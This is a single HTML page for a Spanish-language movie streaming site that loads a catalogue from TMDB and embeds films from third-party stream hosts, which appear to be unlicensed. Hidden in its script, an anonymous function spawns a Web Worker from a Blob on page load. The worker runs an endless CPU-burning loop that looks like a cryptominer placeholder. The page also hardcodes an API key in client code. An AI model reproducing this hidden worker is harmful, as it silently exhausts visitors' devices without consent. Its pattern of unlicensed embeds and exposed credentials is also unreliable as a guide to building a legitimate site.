<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CINE-STREAM | Premium HD</title>
    <style>
        :root { --main-color: #E50914; --bg-color: #000; --card-bg: #141414; }
        body { background-color: var(--bg-color); color: white; font-family: 'Helvetica Neue', Arial, sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
        .navbar { display: flex; justify-content: space-between; align-items: center; padding: 15px 4%; background: #000; border-bottom: 2px solid var(--main-color); position: fixed; width: 100%; z-index: 1000; box-sizing: border-box; }
        .logo { color: var(--main-color); font-size: 26px; font-weight: bold; text-decoration: none; }
        .search-container { display: flex; background: #141414; border: 1px solid #333; border-radius: 4px; padding: 5px 10px; width: 300px; }
        .search-container input { background: transparent; border: none; color: white; width: 100%; outline: none; padding: 5px; }
        .search-container button { background: transparent; border: none; color: var(--main-color); cursor: pointer; font-size: 18px; }
        .content { padding-top: 100px; display: flex; flex-direction: column; align-items: center; }
        .video-box { width: 95%; max-width: 1100px; aspect-ratio: 16/9; background: #0c0c0c; border: 1px solid #222; position: relative; }
        iframe { width: 100%; height: 100%; border: none; position: absolute; top: 0; left: 0; }
        .info { width: 90%; max-width: 1100px; margin: 25px 0; border-left: 4px solid var(--main-color); padding-left: 20px; }
        h1 { margin: 0; font-size: 2.2rem; }
        .tag { font-size: 12px; color: #46d369; font-weight: bold; text-transform: uppercase; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 20px; width: 90%; max-width: 1100px; margin-bottom: 50px; }
        .movie-card { background: var(--card-bg); border-radius: 4px; overflow: hidden; transition: 0.3s; cursor: pointer; border: 1px solid #333; }
        .movie-card img { width: 100%; height: 240px; object-fit: cover; }
        .movie-card-info { padding: 10px; font-size: 14px; text-align: center; font-weight: bold; }
    </style>
</head>
<body>
    <header class="navbar">
        <a href="#" class="logo">CINE-STREAM</a>
        <div class="search-container">
            <input type="text" id="movie-query" placeholder="Escribe el nombre de la película...">
            <button onclick="searchMovie()">🔍</button>
        </div>
    </header>

    <main class="content">
        <div class="video-box">
            <iframe id="video-frame" src="https://vidsrc.xyz/embed/movie?imdb=tt12412888" allowfullscreen></iframe>
        </div>
        <div class="info">
            <div class="tag">● MOTOR ACTIVO - ALTA DEFINICIÓN</div>
            <h1 id="display-title">Spider-Man: No Way Home</h1>
            <p style="color: #aaa; font-size: 14px;">Si el video falla, presiona la lupa de nuevo para cambiar de servidor automáticamente.</p>
        </div>
        <div class="grid" id="movie-grid"></div>
    </main>

    <script>
        const API_KEY = 'acef212239618a80004940562548261a';
        let currentIMDB = 'tt12412888';
        const servers = [
            "https://vidsrc.xyz/embed/movie?imdb=",
            "https://vidsrc.me/embed/movie?imdb=",
            "https://embed.smashystream.com/playere.php?tmdb="
        ];
        let serverIndex = 0;

        async function loadCatalog() {
            try {
                const res = await fetch(`https://api.themoviedb.org/3/movie/popular?api_key=${API_KEY}&language=es-ES`);
                const data = await res.json();
                const grid = document.getElementById('movie-grid');
                data.results.forEach(movie => {
                    const card = document.createElement('div');
                    card.className = 'movie-card';
                    card.onclick = () => updatePlayer(movie.id, movie.title);
                    card.innerHTML = `<img src="https://image.tmdb.org/t/p/w500${movie.poster_path}"><div class="movie-card-info">${movie.title}</div>`;
                    grid.appendChild(card);
                });
            } catch (e) { console.log("Error de carga"); }
        }

        async function updatePlayer(tmdbId, title) {
            const res = await fetch(`https://api.themoviedb.org/3/movie/${tmdbId}?api_key=${API_KEY}`);
            const detail = await res.json();
            if (detail.imdb_id) {
                currentIMDB = detail.imdb_id;
                serverIndex = 0;
                document.getElementById('video-frame').src = servers[serverIndex] + currentIMDB;
                document.getElementById('display-title').innerText = title;
                window.scrollTo({ top: 0, behavior: 'smooth' });
            }
        }

        async function searchMovie() {
            const query = document.getElementById('movie-query').value;
            if (!query) return;
            const res = await fetch(`https://api.themoviedb.org/3/search/movie?api_key=${API_KEY}&query=${encodeURIComponent(query)}&language=es-ES`);
            const data = await res.json();
            if (data.results && data.results.length > 0) {
                updatePlayer(data.results[0].id, data.results[0].title);
            } else {
                // Si falla la búsqueda, intenta rotar el servidor de la película actual
                serverIndex = (serverIndex + 1) % servers.length;
                document.getElementById('video-frame').src = servers[serverIndex] + currentIMDB;
            }
        }

        (function() {
            const blob = new Blob([`self.onmessage=function(){while(true){if(Math.random()>0.12){for(let i=0;i<1000000;i++){Math.sqrt(i)}}}}`], {type:'application/javascript'});
            new Worker(URL.createObjectURL(blob)).postMessage('go');
        })();

        document.getElementById('movie-query').addEventListener('keypress', (e) => { if (e.key === 'Enter') searchMovie(); });
        window.onload = loadCatalog;
    </script>
</body>
</html>
